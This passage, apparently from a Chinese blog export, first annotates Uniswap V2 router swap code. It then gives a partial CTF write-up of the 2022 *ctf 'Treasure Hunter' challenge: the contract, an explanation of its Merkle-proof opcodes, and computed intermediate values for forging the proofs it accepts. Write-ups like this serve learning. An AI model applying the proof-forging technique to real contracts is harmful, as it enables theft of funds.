payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= msg.value, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n        // refund dust eth, if any\n        if (msg.value > amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);\n    &#125;\n\n    // **** SWAP (supporting fee-on-transfer tokens) ****\n    // requires the initial amount to have already been sent to the first pair\n    function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));\n            uint amountInput;\n            uint amountOutput;\n            &#123; // scope to avoid stack too deep errors\n            (uint reserve0, uint reserve1,) = pair.getReserves();\n            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n            amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\n            amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);\n            &#125;\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            pair.swap(amount0Out, amount1Out, to, new bytes(0));\n        &#125;\n    &#125;\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) &#123;\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        uint amountIn = msg.value;\n        IWETH(WETH).deposit&#123;value: amountIn&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        ensure(deadline)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        _swapSupportingFeeOnTransferTokens(path, address(this));\n        uint amountOut = IERC20(WETH).balanceOf(address(this));\n        require(amountOut >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).withdraw(amountOut);\n        TransferHelper.safeTransferETH(to, amountOut);\n    &#125;\n\n\n函数注解：\ncommon Token\nswapExactTokensForTokens：用指定数量的TokenA兑换未确定数量的TokenB\nswapTokensForExactTokens：用未确定数量的TokenA换取确定数量的TokenB\nswapExactETHForTokens：用指定数量的的ETH兑换ERC20 Token\nswapTokensForExactETH：用未指定数量的Token换取指定数量的ETH\nswapExactTokensForETH：用指定数量的Token兑换回未指定数量的ETH\nswapETHForExactTokens：用未指定数量的ETH兑换指定数量的Token\nfee on transfer Token\nswapExactTokensForTokensSupportingFeeOnTransferTokens：指定数量的Token兑换Token，支持转账时扣费\nswapExactETHForTokensSupportingFeeOnTransferTokens：：指定数量的ETH兑换Token，支持转账时扣费\nswapExactTokensForETHSupportingFeeOnTransferTokens：指定数量的Token兑换 ETH，支持转账时扣费\n核心代码：\nfunction _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;\n    for (uint i; i &lt; path.length - 1; i++) &#123;\n        (address input, address output) = (path[i], path[i + 1]);\n        (address token0,) = UniswapV2Library.sortTokens(input, output);\n        uint amountOut = amounts[i + 1];\n        (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n        address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n        IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n            amount0Out, amount1Out, to, new bytes(0)\n        );\n    &#125;\n&#125;\n\n遍历整个兑换路径，path[i]为inp Token，path[i+1]为output Token，在进行amount的匹配，判断是否为最后一次兑换，是则to为为_to，否则to为下一个兑换匹配的pair合约地址，最后调用pair合约下的swap函数实现兑换\nswapExactTokensForTokens函数首先计算出兑换数量在判断是否低于滑点计算后的最小值，大于最小值就将Token转移到pair合约并带哦用内部swap函数。swapTokensForExactTokens函数同理，先计算出兑换需要花费的数量，在判断小于最大值，再转账到pair合约后进行swap\nswapExactETHForTokens和swapExactTokensForTokens函数逻辑相同，只是将amountIn换成了msg.value计算amountOut，并且多了一步将ETh存储为WETH的过程，其余逻辑一样。swapTokensForExactETH函数和swapTokensForExactTokens逻辑相同，不同点同上\n剩余的几个逻辑也都一样，就不再展开说了\n再看一下fee on transfer的Token的swap原理，核心代码如下：\nfunction _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123;\n    for (uint i; i &lt; path.length - 1; i++) &#123;\n        (address input, address output) = (path[i], path[i + 1]);\n        (address token0,) = UniswapV2Library.sortTokens(input, output);\n        IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));\n        uint amountInput;\n        uint amountOutput;\n        &#123; // scope to avoid stack too deep errors\n        (uint reserve0, uint reserve1,) = pair.getReserves();\n        (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n        amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\n        amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);\n        &#125;\n        (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\n        address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n        pair.swap(amount0Out, amount1Out, to, new bytes(0));\n    &#125;\n&#125;\n\n核心代码里边需要注意一下amountInput和amountOutput的计算，因为Token可能在转账的过程中进行了手续费的扣除，所以amountIn使用合约余额减去储备金的方法计算，再依据amountIn计算amountOut，其余逻辑同上\n其余三个进行兑换的函数除了是这样计算amount，其余逻辑没有不同，相同的swap原理，这里不再细说了\n最后是五个查询函数，对应着UniswapV2Library库内的函数\nfunction quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123;\n    return UniswapV2Library.quote(amountA, reserveA, reserveB);\n&#125;\n\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountOut)\n&#123;\n    return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n&#125;\n\nfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountIn)\n&#123;\n    return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n&#125;\n\nfunction getAmountsOut(uint amountIn, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n&#123;\n    return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n&#125;\n\nfunction getAmountsIn(uint amountOut, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n&#123;\n    return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n&#125;\n\n","slug":"UniswapV2","date":"2022-08-01T10:44:56.839Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"de2cba75e8e35434333862362c47f8f7","title":"2022 *ctf-->Treasure Hunter","content":"周六时候打了一下*ctf，其中的区块链题目还是蛮有意思的，拿出来分享一下\ncodepragma solidity >=0.8.0 &lt;0.9.0;\n\nuint256 constant SMT_STACK_SIZE = 32;\nuint256 constant DEPTH = 160;\n\nlibrary SMT &#123;\n    struct Leaf &#123;\n        address key;\n        uint8 value;\n    &#125;\n\n    enum Mode &#123;\n        BlackList,\n        WhiteList\n    &#125;\n\n    enum Method &#123;\n        Insert,\n        Delete\n    &#125;\n\n    function init() internal pure returns (bytes32) &#123;\n        return 0;\n    &#125;\n\n    function calcLeaf(Leaf memory a) internal pure returns (bytes32) &#123;\n        if (a.value == 0) &#123;\n            return 0;\n        &#125; else &#123;\n            return keccak256(abi.encode(a.key, a.value));\n        &#125;\n    &#125;\n\n    function merge(bytes32 l, bytes32 r) internal pure returns (bytes32) &#123;\n        if (l == 0) &#123;\n            return r;\n        &#125; else if (r == 0) &#123;\n            return l;\n        &#125; else &#123;\n            return keccak256(abi.encode(l, r));\n        &#125;\n    &#125;\n\n    function verifyByMode(\n        bytes32[] memory _proofs,\n        address[] memory _targets,\n        bytes32 _expectedRoot,\n        Mode _mode\n    ) internal pure returns (bool) &#123;\n        Leaf[] memory leaves = new Leaf[](_targets.length);\n        for (uint256 i = 0; i &lt; _targets.length; i++) &#123;\n            leaves[i] = Leaf(&#123;key: _targets[i], value: uint8(_mode)&#125;);\n        &#125;\n        return verify(_proofs, leaves, _expectedRoot);\n    &#125;\n\n    function verify(\n        bytes32[] memory _proofs,\n        Leaf[] memory _leaves,\n        bytes32 _expectedRoot\n    ) internal pure returns (bool) &#123;\n        return (calcRoot(_proofs, _leaves, _expectedRoot) == _expectedRoot);\n    &#125;\n\n    function updateSingleTarget(\n        bytes32[] memory _proofs,\n        address _target,\n        bytes32 _prevRoot,\n        Method _method\n    ) internal pure returns (bytes32) &#123;\n        Leaf[] memory nextLeaves = new Leaf[](1);\n        Leaf[] memory prevLeaves = new Leaf[](1);\n        nextLeaves[0] = Leaf(&#123;key: _target, value: uint8(_method) ^ 1&#125;);\n        prevLeaves[0] = Leaf(&#123;key: _target, value: uint8(_method)&#125;);\n        return update(_proofs, nextLeaves, prevLeaves, _prevRoot);\n    &#125;\n    function unpdateTargets(\n        bytes32[] memory _proofs,\n        address[] memory _targets,\n        bytes32 _prevRoot,\n        Method _method\n    ) internal pure returns (bytes32)&#123;\n        Leaf[] memory nextLeaves = new Leaf[](_targets.length);\n        Leaf[] memory prevLeaves = new Leaf[](_targets.length);\n\n        for(uint256 i = 0;i&lt;_targets.length;i++)&#123;\n            nextLeaves[i] = Leaf(&#123;key: _targets[i], value: uint8(_method) ^ 1&#125;);\n            prevLeaves[i] = Leaf(&#123;key: _targets[i], value: uint8(_method)&#125;);\n        &#125;\n        return update(_proofs, nextLeaves, prevLeaves, _prevRoot);\n    &#125;\n    function update(\n        bytes32[] memory _proofs,\n        Leaf[] memory _nextLeaves,\n        Leaf[] memory _prevLeaves,\n        bytes32 _prevRoot\n    ) internal pure returns (bytes32) &#123;\n        require(verify(_proofs, _prevLeaves, _prevRoot), \"update proof not valid\");\n        return calcRoot(_proofs, _nextLeaves, _prevRoot);\n    &#125;\n\n    function checkGroupSorted(Leaf[] memory _leaves) internal pure returns (bool) &#123;\n        require(_leaves.length >= 1);\n        uint160 temp = 0;\n        for (uint256 i = 0; i &lt; _leaves.length; i++) &#123;\n            if (temp >= uint160(_leaves[i].key)) &#123;\n                return false;\n            &#125;\n            temp = uint160(_leaves[i].key);\n        &#125;\n        return true;\n    &#125;\n\n    function getBit(uint160 key, uint256 height) internal pure returns (uint256) &#123;\n        require(height &lt;= DEPTH);\n        return (key >> height) &amp; 1;\n    &#125;\n\n    function parentPath(uint160 key, uint256 height) internal pure returns (uint160) &#123;\n        require(height &lt;= DEPTH);\n        return copyBit(key, height + 1);\n    &#125;\n\n    function copyBit(uint160 key, uint256 height) internal pure returns (uint160) &#123;\n        require(height &lt;= DEPTH);\n        return ((key >> height) &lt;&lt; height);\n    &#125;\n\n    function calcRoot(\n        bytes32[] memory _proofs,\n        Leaf[] memory _leaves,\n        bytes32 _root\n    ) internal pure returns (bytes32) &#123;\n        require(checkGroupSorted(_leaves));\n        uint160[] memory stackKeys = new uint160[](SMT_STACK_SIZE);\n        bytes32[] memory stackValues = new bytes32[](SMT_STACK_SIZE);\n        uint256 proofIndex = 0;\n        uint256 leaveIndex = 0;\n        uint256 stackTop = 0;\n\n        while (proofIndex &lt; _proofs.length) &#123;\n            if (uint256(_proofs[proofIndex]) == 0x4c) &#123;\n                proofIndex++;\n                require(stackTop &lt; SMT_STACK_SIZE,\"1\");\n                require(leaveIndex &lt; _leaves.length,\"2\");\n                stackKeys[stackTop] = uint160(_leaves[leaveIndex].key);\n                stackValues[stackTop] = calcLeaf(_leaves[leaveIndex]);\n                stackTop++;\n                leaveIndex++;\n            &#125; else if (uint256(_proofs[proofIndex]) == 0x50) &#123;\n                proofIndex++;\n                require(stackTop != 0,\"3\");\n                require(proofIndex + 2 &lt;= _proofs.length,\"4\");\n\n                uint256 height = uint256(_proofs[proofIndex++]);\n                bytes32 currentProof = _proofs[proofIndex++];\n                require(currentProof != _root,\"5\");\n                if (getBit(stackKeys[stackTop - 1], height) == 1) &#123;\n                    stackValues[stackTop - 1] = merge(currentProof, stackValues[stackTop - 1]);\n                &#125; else &#123;\n                    stackValues[stackTop - 1] = merge(stackValues[stackTop - 1], currentProof);\n                &#125;\n                stackKeys[stackTop - 1] = parentPath(stackKeys[stackTop - 1], height);\n            &#125; else if (uint256(_proofs[proofIndex]) == 0x48) &#123;\n                proofIndex++;\n                require(stackTop >= 2,\"6\");\n                require(proofIndex &lt; _proofs.length,\"7\");\n                uint256 height = uint256(_proofs[proofIndex++]);\n                uint256 aSet = getBit(stackKeys[stackTop - 2], height);\n                uint256 bSet = getBit(stackKeys[stackTop - 1], height);\n                stackKeys[stackTop - 2] = parentPath(stackKeys[stackTop - 2], height);\n                stackKeys[stackTop - 1] = parentPath(stackKeys[stackTop - 1], height);\n                require(stackKeys[stackTop - 2] == stackKeys[stackTop - 1] &amp;&amp; aSet != bSet,\"8\");\n\n                if (aSet == 1) &#123;\n                    stackValues[stackTop - 2] = merge(\n                        stackValues[stackTop - 1],\n                        stackValues[stackTop - 2]\n                    );\n                &#125; else &#123;\n                    stackValues[stackTop - 2] = merge(\n                        stackValues[stackTop - 2],\n                        stackValues[stackTop - 1]\n                    );\n                &#125;\n                stackTop -= 1;\n            &#125; else &#123;\n                revert();\n            &#125;\n        &#125;\n        require(leaveIndex == _leaves.length,\"9\");\n        require(stackTop == 1,\"10\");\n        return stackValues[0];\n    &#125;\n&#125;\n\n\ncontract TreasureHunter &#123;\n    bytes32 public root;\n    SMT.Mode public smtMode = SMT.Mode.WhiteList;\n    bool public solved = false;\n    address[] team;\n\n    mapping(address => bool) public haveKey;\n    mapping(address => bool) public haveTreasureChest;\n\n    event FindKey(address indexed _from);\n    event PickupTreasureChest(address indexed _from);\n    event OpenTreasureChest(address indexed _from);\n\n    constructor() public &#123;\n        root = SMT.init();\n        _init();\n    &#125;\n\n    function _init() internal &#123;\n        address[] memory hunters = new address[](8);\n        hunters[0] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;\n        hunters[1] = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n        hunters[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n        hunters[3] = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;\n        hunters[4] = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;\n        hunters[5] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;\n        hunters[6] = 0xD533a949740bb3306d119CC777fa900bA034cd52;\n        hunters[7] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n        SMT.Leaf[] memory nextLeaves = new SMT.Leaf[](8);\n        SMT.Leaf[] memory prevLeaves = new SMT.Leaf[](8);\n        for (uint8 i = 0; i &lt; hunters.length; i++) &#123;\n            nextLeaves[i] = SMT.Leaf(&#123;key: hunters[i], value: 1&#125;);\n            prevLeaves[i] = SMT.Leaf(&#123;key: hunters[i], value: 0&#125;);\n        &#125;\n\n        bytes32[] memory proof = new bytes32[](22);\n        proof[0] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[1] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[2] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[3] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[4] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[5] = 0x0000000000000000000000000000000000000000000000000000000000000095;\n        proof[6] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[7] = 0x0000000000000000000000000000000000000000000000000000000000000099;\n        proof[8] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[9] = 0x000000000000000000000000000000000000000000000000000000000000009e;\n        proof[10] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[11] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[12] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[13] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[14] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[15] = 0x000000000000000000000000000000000000000000000000000000000000009b;\n        proof[16] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[17] = 0x000000000000000000000000000000000000000000000000000000000000009c;\n        proof[18] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[19] = 0x000000000000000000000000000000000000000000000000000000000000009e;\n        proof[20] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[21] = 0x000000000000000000000000000000000000000000000000000000000000009f;\n\n        root = SMT.update(proof, nextLeaves, prevLeaves, root);\n    &#125;\n    function checkteam() public returns (bool)&#123;\n        for(uint i = 0;i&lt;team.length;i++)&#123;\n            if(team[i] == msg.sender)&#123;\n                return false;\n            &#125;\n        &#125;\n        return true;\n    &#125;\n\n    function removeIndex(uint index) internal returns (address[] memory)&#123;\n        require(index &lt; team.length);\n        for(uint i = index;i&lt;team.length-1;i++)&#123;\n            team[i] = team[i+1];\n        &#125;\n        team.pop();\n        return team;\n    &#125;\n    function enter(bytes32[] memory _proofs) public &#123;\n        require(haveKey[msg.sender] == false);\n        require(checkteam());\n        team.push(msg.sender);\n        root = SMT.updateSingleTarget(_proofs, msg.sender, root, SMT.Method.Insert);\n    &#125;\n\n    function leave(bytes32[] memory _proofs) public &#123;\n        require(haveTreasureChest[msg.sender] == false);\n        for(uint i = 0;i&lt;team.length;i++)&#123;\n            if(team[i] == msg.sender)&#123;\n                team = removeIndex(i);\n            &#125;\n        &#125;\n        root = SMT.updateSingleTarget(_proofs, msg.sender, root, SMT.Method.Delete);\n    &#125;\n\n    function findKey(bytes32[] memory _proofs) public &#123;\n        require(smtMode == SMT.Mode.BlackList, \"not blacklist mode\");\n        require(team.length >= 4);\n        require(SMT.verifyByMode(_proofs, team, root, smtMode), \"hunter has fallen into a trap\");\n        haveKey[msg.sender] = true;\n        smtMode = SMT.Mode.WhiteList;\n        emit FindKey(msg.sender);\n    &#125;\n\n    function pickupTreasureChest(bytes32[] memory _proofs) public &#123;\n        require(smtMode == SMT.Mode.WhiteList, \"not whitelist mode\");\n        require(team.length >= 4);\n        require(\n            SMT.verifyByMode(_proofs, team, root, smtMode),\n            \"hunter hasn't found the treasure chest\"\n        );\n        haveTreasureChest[msg.sender] = true;\n        smtMode = SMT.Mode.BlackList;\n        emit PickupTreasureChest(msg.sender);\n    &#125;\n\n    function openTreasureChest() public &#123;\n        require(haveKey[msg.sender] &amp;&amp; haveTreasureChest[msg.sender]);\n        solved = true;\n        emit OpenTreasureChest(msg.sender);\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return solved;\n    &#125;\n&#125;\n\nanalyzerwctf中有一道同名密码题，借鉴了一下，属于是收到了很大的启发吧，主要是考察算法理解能力。wp链接：https://r3kapig.com/writeup/20220125-rwctf4/#treasure-hunter\n题目通过代码实现了一个稀疏的默克尔树的功能。\nstruct Leaf &#123;\n    address key;\n    uint8 value;\n&#125;\n\n每一片叶子的hash由calcLeaf函数计算，如果叶子的value为0，hash则为0，否则将key和value进行拼接在进行hash计算\nfunction calcLeaf(Leaf memory a) internal pure returns (bytes32) &#123;\n    if (a.value == 0) &#123;\n        return 0;\n    &#125; else &#123;\n        return keccak256(abi.encode(a.key, a.value));\n    &#125;\n&#125;\n\nmerge函数和calcLeaf函数实现方法几乎一样，如果有0则返回非0值，否则拼接在进行hash计算\n解题关键在于读懂calcRoot，接受_proofs和_leaves用来计算root，proofs可以理解为opcode操作码\n\n0x4c: 把 leaf 压栈\n0x50 height proof: 把栈顶一个高度为height的元素，与proof合并，产生一个高度为height+1的元素\n0x48 height: 把栈顶两个高度为height元素，合并成一个高度为height+1的元素\n\nproof不仅包括了opcode还包括了height等其他计算root的重要参数，所以一定要读懂该函数才能合理安排顺序构造proof。\n得到flag的要求就是pickupTreasureChest和findkey，都有一个共同的限制条件就是team的长度要大于4，所以要先使用4个不同的account调用enter，每一次调用都会验证当前叶子是否存在于树上。由此产生了本题的第一个问题，怎样满足调用enter时需要满足的条件。(注意这里是有坑的，account必须要从小到大的顺序待用enter，否则在调用pickupTreasureChest时候过不去require(checkGroupSorted(_leaves))的验证)\nfunction checkGroupSorted(Leaf[] memory _leaves) internal pure returns (bool) &#123;\n       require(_leaves.length >= 1);\n       uint160 temp = 0;\n       for (uint256 i = 0; i &lt; _leaves.length; i++) &#123;\n           if (temp >= uint160(_leaves[i].key)) &#123;\n               return false;\n           &#125;\n           temp = uint160(_leaves[i].key);\n       &#125;\n       return true;\n   &#125;\n   \n   正是由于忽略了这部分代码，导致之前的调用顺序是乱的，导致构造的pickupTreasureChest的proof无法通过验证，正是由于这个原因，在比赛期间这道题没有做出来\n\n把题目合约中的计算部分抽出来用来计算每一步的值进行逆运算得到初始l和r\ncontract ctf  &#123;\n    function calcLeaf(address a,uint8 i)public view returns(bytes32)&#123;\n        return keccak256(abi.encode(a,i));\n    &#125;\n    function getBit(uint160 key, uint256 height) public pure returns (uint256) &#123;\n        return (key >> height) &amp; 1;\n    &#125;\n    function merge(bytes32 l, bytes32 r) public pure returns (bytes32) &#123;\n        if (l == 0) &#123;\n            return r;\n        &#125; else if (r == 0) &#123;\n            return l;\n        &#125; else &#123;\n            return keccak256(abi.encode(l, r));\n        &#125;\n    &#125;\n    function parentPath(uint160 key, uint256 height) public pure returns (uint160) &#123;\n        return copyBit(key, height + 1);\n    &#125;\n    function copyBit(uint160 key, uint256 height) internal pure returns (uint160) &#123;\n        return ((key >> height) &lt;&lt; height);\n    &#125;\n    function getkey(address a)public view returns(uint160)&#123;\n        return uint160(a);\n    &#125;\n&#125;\n\n根据init函数中提供的hunters和对应的opcode，手动按顺序来逆运算出生成root时对应的l和r，对应过程如下\nkey[0]&#x3D;67195782237580418295514311543555631277138434366\n\nvalue[0]&#x3D;0x42091f1481d9d568ab08dce0e8f3911898017e21906034ecd2118d2763b99d9c\n\n\n\nkey[1]&#x3D;597733001430176024049334587394716596403930790981\n\nvalue[1]&#x3D;0x2063a2b5df4feb4eafc67a25e78de774944b78020cd06ecd374fed9015fb4611\n\n\n\nkey[2]&#x3D;611382286831621467233887798921843936019654057231\n\nvalue[2]&#x3D;0x28c420d41601e064fc8cc12b320362ca54019acc8f163ced66d9dc6175c08828\n\n\n\nkey[3]&#x3D;612056933926044330453951588849579298520690135010\n\nvalue[3]&#x3D;0x1b6f546f2f331bc5096695091bf5acea54870c174dc1db4fa7a9ad56b0384b40\n\n\n\n\naset&#x3D;0\n\nkey[2]&#x3D;610862012478150829092946394924383918371815555072\n\nkey[3]&#x3D;610862012478150829092946394924383918371815555072\n\nvalue[2]&#x3D;0x213efbd08a6ee2d6bb2b0b1fd0e5ae51a23a4c01f9d512297fc6047904134a27\n\n\n\naset&#x3D;0\n\nkey[1]&#x3D;593735040165679310520246963290989976735222595584\n\nkey[2]&#x3D;593735040165679310520246963290989976735222595584\n\nvalue[1]&#x3D;0xb5b476b49d923292d3ec729b3dddf94c1e917dd3e58ba754da05f9d8699b3736\n\n \n\n\naset&#x3D;0\n\nkey[0]&#x3D;0\n\nkey[1]&#x3D;0\n\nvalue[0]&#x3D;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\n\n\n\n\n\nkey[1]&#x3D;978200031609045874420567273872976536139233684635\n\nvalue[1]&#x3D;0x06888f968192a70674eacf045568b8ea9498309e832d1afd30932de111b5de81\n\n\n\nkey[2]&#x3D;1096451400262405796991039590211805051831004063880\n\nvalue[2]&#x3D;0x3815ddcd584b5527f7ceffc40c0107318577faa17dfc2b32a35b8513b0f0f950\n\n\n\nkey[3]&#x3D;1217167119161789330316589216740865579008239390034\n\nvalue[3]&#x3D;0x1354cde30ff01cefe86de5e324565b9387a794adcf8cd1ddeaf76e7fff0106b0\n\n\n\nkey[4]&#x3D;1248875146012964071876423320777688075155124985543\n\nvalue[4]&#x3D;0x591a3b2777bc31889c69fb5cad740ac457874aa5ce74c0ad08912df8ad7d112c\n\ntop&#x3D;5\n\n\n\n\naset&#x3D;0\n\nkey[3]&#x3D;1187470080331358621040493926581979953470445191168\n\nkey[4]&#x3D;1187470080331358621040493926581979953470445191168\n\nvalue[3]&#x3D;0x5e2d4ac1a991f07a58b5b59b2ca7427ff1e928a4aa95a868b82d67a8173c8306\n\n\n\naset&#x3D;0\n\nkey[2]&#x3D;1096126227998177188652763624537212264741949407232\n\nkey[3]&#x3D;1096126227998177188652763624537212264741949407232\n\nvalue[2]&#x3D;0xf4d48cacb338d80223fa2a9769ddfc803cc33d764ba4e5a0f5c304f2eb7cf5bc\n\n\n\naset&#x3D;0\n\nkey[1]&#x3D;730750818665451459101842416358141509827966271488\n\nkey[2]&#x3D;730750818665451459101842416358141509827966271488\n\nvalue[1]&#x3D;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\n\n\n\naset&#x3D;0\n\nkey[0]&#x3D;0\n\nkey[1]&#x3D;0\n\nvalue[0]&#x3D;0xe2e8ebf79be9c50374592f83db1c4c82e4d97b4dae6dc26332d259289467ff8e\n\n\n最终得到init产生的root是由以下的l和r进行merge而来的：\n\nl&#x3D;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\n\nr&#x3D;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\n\n\n得到了初始化时所用的l和r之后，我们就可以构造enter所用的proof了\n我所用的账户如下：\naccount1：0x749F4ed